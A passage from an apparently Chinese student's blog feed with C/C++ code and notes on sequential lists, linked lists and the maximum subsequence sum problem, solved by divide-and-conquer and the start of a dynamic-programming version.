L-&gt;Last<span class="hljs-number">+1</span> &lt; i)&#123;  <span class="hljs-comment">//位置越界，如果将数插入 L-&gt;Data[L-&gt;Last+1]，下面都不用腾位置了 </span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;位置不合法&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=L-&gt;Last;j&gt;=i;j--)   <span class="hljs-comment">// 从后往前依次向后挪一个，给 a[i]腾出位置     </span><br>        L-&gt;Data[j<span class="hljs-number">+1</span>] = L-&gt;Data[j];   <br>    L-&gt;Data[i] = X;    <span class="hljs-comment">//新元素插入</span><br>    L-&gt;Last++;    <span class="hljs-comment">// Last仍然指向最后元素</span><br>    <span class="hljs-keyword">return</span>;<br>&#125; <br><br><span class="hljs-comment">//删除</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">0</span> || L-&gt;Last &lt;i)&#123;  <span class="hljs-comment">//位置越界，而删除最多到 L-&gt;Data[L-&gt;Last]</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;L-&gt;Data[%d]不存在元素&quot;</span>,i);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">+1</span>;j&lt;=L-&gt;Last;j++)   <span class="hljs-comment">// 从前往后依次向前挪一个，将 a[i] 覆盖了 </span><br>        L-&gt;Data[j<span class="hljs-number">-1</span>] = L-&gt;Data[j];<br>    L-&gt;Last--;  <span class="hljs-comment">// Last仍然指向最后元素</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 按序查找</span><br><span class="hljs-function">ElementType <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>&#123;<br><span class="hljs-keyword">if</span>(K &lt; <span class="hljs-number">0</span> || L-&gt;Last &lt; K)&#123;  <span class="hljs-comment">//位置越界</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;L-&gt;Data[%d]不存在元素&quot;</span>,K);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> L-&gt;Data[K];<br>&#125;<br><br><span class="hljs-comment">//表长</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>&#123;<br><span class="hljs-keyword">return</span> L-&gt;Last<span class="hljs-number">+1</span>;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L = <span class="hljs-built_in">MakeEmpty</span>();<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入11\n&quot;</span>);<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">25</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入25\n&quot;</span>);<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">33</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入33\n&quot;</span>);<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">77</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入77\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;此时的线性表为：&quot;</span>); <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">Length</span>(L);i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,L-&gt;Data[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查找值为12的下标是：%d\n&quot;</span>,<span class="hljs-built_in">Find</span>(<span class="hljs-number">12</span>,L));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标为3的线性表的值是：%d\n&quot;</span>,<span class="hljs-built_in">FindKth</span>(<span class="hljs-number">3</span>,L));<br><span class="hljs-built_in">Delete</span>(<span class="hljs-number">2</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除线性表中下标为2的元素\n&quot;</span>);<br><span class="hljs-built_in">Delete</span>(<span class="hljs-number">2</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除线性表中下标为2的元素\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;此时的线性表为：&quot;</span>); <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">Length</span>(L);i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,L-&gt;Data[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><p><strong>链表：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType; <span class="hljs-comment">// ElementType 可定义为任意类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;<br>ElementType Data;   <span class="hljs-comment">//数据域 </span><br>List Next;   <span class="hljs-comment">// 下一个链表的地址 </span><br>&#125;; <br>List L;<br><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//初始化链表 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>;  <span class="hljs-comment">// 以遍历链表的方法求链表长度 </span><br><span class="hljs-function">List <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>;  <span class="hljs-comment">// 按序号查找 </span><br><span class="hljs-function">List <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>;  <span class="hljs-comment">// 按值查找 </span><br><span class="hljs-function">List <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>;  <span class="hljs-comment">//将 X 插入到第 i-1(i&gt;0) 个结点之后 </span><br><span class="hljs-function">List <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>; <span class="hljs-comment">// 删除第 i(i&gt;0) 个结点 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>; <span class="hljs-comment">// 输出链表元素 </span><br><br><span class="hljs-comment">// 初始化链表 </span><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>L = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> L;<br>&#125;<br><br><span class="hljs-comment">//求表长 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>&#123;<br>List p = L;<br><span class="hljs-type">int</span> len=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(p)&#123;  <span class="hljs-comment">// 当 p 不为空 </span><br>p = p-&gt;Next;<br>len++;<br>&#125;<br><span class="hljs-keyword">return</span> len;<br>&#125; <br><br><span class="hljs-comment">// 按序查找 </span><br><span class="hljs-function">List <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>&#123;<br>List p = L;<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;  <span class="hljs-comment">//从 1 开始 </span><br><span class="hljs-keyword">while</span>(p &amp;&amp; i&lt;K)&#123;<br>p = p-&gt;Next;<br>i++;<br>&#125;<br><span class="hljs-keyword">if</span>(i == K)    <span class="hljs-comment">// 找到了 </span><br><span class="hljs-keyword">return</span> p;<br><span class="hljs-keyword">else</span>    <span class="hljs-comment">// 未找到 </span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125; <br><br><span class="hljs-comment">// 按值查找  </span><br><span class="hljs-function">List <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>&#123;<br>List p = L;<br><span class="hljs-keyword">while</span>(p &amp;&amp; p-&gt;Data!=X)<br>p = p-&gt;Next;<br><span class="hljs-comment">// 找到了，返回 p</span><br><span class="hljs-comment">// 未找到，返回 NULL，此时 p 等于 NULL </span><br><span class="hljs-keyword">return</span> p;   <br>&#125; <br><br><span class="hljs-comment">/* 插入</span><br><span class="hljs-comment">1. 用 s 指向一个新的结点</span><br><span class="hljs-comment">2. 用 p 指向链表的第 i-1 个结点 </span><br><span class="hljs-comment">3. s-&gt;Next = p-&gt;Next，将 s 的下一个结点指向 p 的下一个结点 </span><br><span class="hljs-comment">4. p-&gt;Next = s，将 p 的下一结点改为 s   */</span><br><span class="hljs-function">List <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>List p,s;<br><span class="hljs-keyword">if</span>(i == <span class="hljs-number">1</span>)&#123;     <span class="hljs-comment">// 新结点插入在表头 </span><br>s = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>s-&gt;Data = X;<br>s-&gt;Next = L;<br><span class="hljs-keyword">return</span> s;     <span class="hljs-comment">//插入的结点为头结点 </span><br>&#125;<br>p = <span class="hljs-built_in">FindKth</span>(i<span class="hljs-number">-1</span>,L);   <span class="hljs-comment">// 找到第 i-1 个结点</span><br><span class="hljs-keyword">if</span>(!p)&#123;   <span class="hljs-comment">// 第 i-1 个结点不存在 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;结点错误&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>s = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>s-&gt;Data = X;<br>s-&gt;Next = p-&gt;Next;   <span class="hljs-comment">//将 s 的下一个结点指向 p 的下一个结点 </span><br>p-&gt;Next = s;   <span class="hljs-comment">// 将 p 的下一结点改为 s</span><br><span class="hljs-keyword">return</span> L;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* 删除</span><br><span class="hljs-comment">1. 用 p 指向链表的第 i-1 个结点 </span><br><span class="hljs-comment">2. 用 s 指向要被删除的的第 i 个结点</span><br><span class="hljs-comment">3. p-&gt;Next = s-&gt;Next，p 指针指向 s 后面</span><br><span class="hljs-comment">4. free(s)，释放空间 </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">List <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>List p,s;<br><span class="hljs-keyword">if</span>(i==<span class="hljs-number">1</span>)&#123;   <span class="hljs-comment">//如果要删除头结点 </span><br>s = L;<br><span class="hljs-keyword">if</span>(L)   <span class="hljs-comment">// 如果不为空 </span><br>L = L-&gt;Next;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">free</span>(s);   <span class="hljs-comment">// 释放被删除结点 </span><br><span class="hljs-keyword">return</span> L; <br>&#125;<br>p = <span class="hljs-built_in">FindKth</span>(i<span class="hljs-number">-1</span>,L);    <span class="hljs-comment">// 查找第 i-1 个结点</span><br><span class="hljs-keyword">if</span>(!p || !(p-&gt;Next))&#123;     <span class="hljs-comment">// 第 i-1 个或第 i 个结点不存在 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;结点错误&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>s = p-&gt;Next;    <span class="hljs-comment">// s 指向第 i 个结点 </span><br>p-&gt;Next = s-&gt;Next;  <span class="hljs-comment">//从链表删除 </span><br><span class="hljs-built_in">free</span>(s);  <span class="hljs-comment">// 释放被删除结点 </span><br><span class="hljs-keyword">return</span> L;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 输出链表元素 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>&#123;<br>List t;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前链表为：&quot;</span>);<br><span class="hljs-keyword">for</span>(t = L;t;t =t-&gt;Next)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  &quot;</span>,t-&gt;Data);<br>flag = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(flag)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>L = <span class="hljs-built_in">MakeEmpty</span>();<br><span class="hljs-built_in">Print</span>(L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">25</span>,<span class="hljs-number">1</span>,L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">33</span>,<span class="hljs-number">2</span>,L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">77</span>,<span class="hljs-number">3</span>,L);<br><span class="hljs-built_in">Print</span>(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前链表长度为：%d\n&quot;</span>,<span class="hljs-built_in">Length</span>(L));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;此时链表中第二个结点的值是：%d\n&quot;</span>,<span class="hljs-built_in">FindKth</span>(<span class="hljs-number">2</span>,L)-&gt;Data);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查找22是否在该链表中：&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">Find</span>(<span class="hljs-number">22</span>,L))<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;是！\n&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;否！\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查找33是否在该链表中：&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">Find</span>(<span class="hljs-number">33</span>,L))<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;是！\n&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;否！\n&quot;</span>);<br>L = <span class="hljs-built_in">Delete</span>(<span class="hljs-number">1</span>,L);<br>L = <span class="hljs-built_in">Delete</span>(<span class="hljs-number">3</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------删除后-----\n&quot;</span>); <br><span class="hljs-built_in">Print</span>(L);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><h2 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h2><p><img src="/dong.github/images/0906-1.png" alt="alt text"><br><img src="/dong.github/images/0906.png" alt="alt text"></p><h2 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h2><p><img src="/dong.github/images/0906-2.png" alt="alt text"><br><img src="/dong.github/images/0906-3.png" alt="alt text"><br><img src="/dong.github/images/0906-4.png" alt="alt text"><br><strong>另一个例子是链式前向星，存树用。当时就要是知道这个就好了，坡度会小很多。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>线性表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构与算法</title>
    <link href="/dong.github/2024/09/05/Algorithms%20&amp;%20Datastructures/"/>
    <url>/dong.github/2024/09/05/Algorithms%20&amp;%20Datastructures/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>绪论。怎么算会呢。书读薄，勤练习喽</strong></p><span id="more"></span><h1 id="参考姥姥："><a href="#参考姥姥：" class="headerlink" title="参考姥姥："></a>参考姥姥：</h1><p><strong><a href="https://github.com/callmePicacho/Data-Structres/blob/master/README.md">https://github.com/callmePicacho/Data-Structres/blob/master/README.md</a></strong><br><strong>终于也到了我去听陈越姥姥的课喽！！！上一次还是翁恺。偶然翻到他们的微博，他们的博客，感受他们的生活。好想去到那样的地方，好想去浙大，认识那些有趣的人。想想真是羡慕，怎样描述呢，那是眼见为实的事，那是无法描述的事，那是至今仍是遥远的理想之城。我一定会抵达。</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-28859c94" role="button" aria-expanded="false" aria-controls="collapse-28859c94">        <div class="fold-arrow">▶</div>序章      </div>      <div class="fold-collapse collapse" id="collapse-28859c94">        <div class="fold-content">          <h2 id="Now-Time-to-take-a-leap-of-FAITH"><a href="#Now-Time-to-take-a-leap-of-FAITH" class="headerlink" title="Now,Time to take a leap of FAITH !"></a>Now,Time to take a leap of FAITH !</h2><p><img src="/dong.github/images/0905-1.png" alt="数据结构层次"><br><img src="/dong.github/images/0905-2.png" alt="逻辑结构&amp;存储结构"><br><img src="/dong.github/images/0905-3.png" alt="数据结构组成"><br><strong>关于分治法的时间复杂度证明：</strong><br><img src="/dong.github/images/0905-6.png" alt="alt text"></p>        </div>      </div>    </div><h1 id="SCU练习平台题解"><a href="#SCU练习平台题解" class="headerlink" title="[SCU练习平台题解]"></a>[SCU练习平台题解]<a href="/dong.github/2024/09/12/Scupractice/" title="课堂练习">课堂练习</a></h1><p><strong>练习</strong><br>PTA 53题 + 上课24例题 + 作业37题：<br>2024&#x2F;09&#x2F;05:<br><strong>NO1，<a href="https://pintia.cn/problem-sets/15/exam/problems/type/7?problemSetProblemId=709&page=0">最大子列和问题</a></strong><br>在线算法，秒辣！</p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>补：分治法      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Max3</span><span class="hljs-params">(<span class="hljs-type">int</span> A,<span class="hljs-type">int</span> B,<span class="hljs-type">int</span> C)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> A &gt; B ? A &gt; C ? A : C : B &gt; C ? B : C;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">DivideAndConquer</span><span class="hljs-params">(<span class="hljs-type">int</span> List[],<span class="hljs-type">int</span> left ,<span class="hljs-type">int</span> right)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> MaxLeftSum,MaxRightSum;<br><span class="hljs-type">int</span> MaxLeftBorderSum,MaxRightBorderSum;<br><br><span class="hljs-type">int</span> LeftBorderSum,RightBorderSum;<br><span class="hljs-type">int</span> center,i;<br><br><span class="hljs-keyword">if</span>(left == right)<br>&#123;<br><span class="hljs-keyword">if</span>(List[left] &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> List[left];<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br>center = (left + right) / <span class="hljs-number">2</span>;<br><br>MaxLeftSum = <span class="hljs-built_in">DivideAndConquer</span>(List,left,center);<br>MaxRightSum = <span class="hljs-built_in">DivideAndConquer</span>(List,center<span class="hljs-number">+1</span>,right);<br><br>MaxLeftBorderSum = <span class="hljs-number">0</span>,LeftBorderSum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i = center;i &gt;= left;i --)&#123;<br>LeftBorderSum += List[i];<br><span class="hljs-keyword">if</span>(LeftBorderSum &gt; MaxLeftBorderSum)<br>&#123;<br>MaxLeftBorderSum = LeftBorderSum;<br>&#125;<br>&#125;<br><br>MaxRightBorderSum = <span class="hljs-number">0</span>,RightBorderSum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>( i = center + <span class="hljs-number">1</span>;i &lt;= right; ++ i)<br>&#123;<br>RightBorderSum += List[i];<br><span class="hljs-keyword">if</span>(RightBorderSum &gt; MaxRightBorderSum)<br>&#123;<br>MaxRightBorderSum = RightBorderSum;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Max3</span>( MaxLeftSum,MaxRightSum,MaxLeftBorderSum+MaxRightBorderSum);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">MaxSubseqSum3</span><span class="hljs-params">(<span class="hljs-type">int</span> List[],<span class="hljs-type">int</span> N)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DivideAndConquer</span>(List,<span class="hljs-number">0</span>,N<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p><strong>这题非常经典，分治法当然不是最好的。</strong><br><strong>“在线算法”实际上是贪心的方法，另一种办法是动态规划</strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-43c07885" role="button" aria-expanded="false" aria-controls="collapse-43c07885">        <div class="fold-arrow">▶</div>动态规划      </div>      <div class="fold-collapse collapse" id="collapse-43c07885">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> dp[<span class="hljs-number">100005</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> t;cin &gt;&gt; t;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>;k &lt;= t;++ k)<br>&#123;<br><span class="hljs-type">int</span> n;cin &gt;&gt; n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)cin &gt;&gt; dp[i];<br><span class="hljs-type">int</span> start = <span class="hljs-number">1</span>,end = <span class="hljs-number">1</span>,p = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> 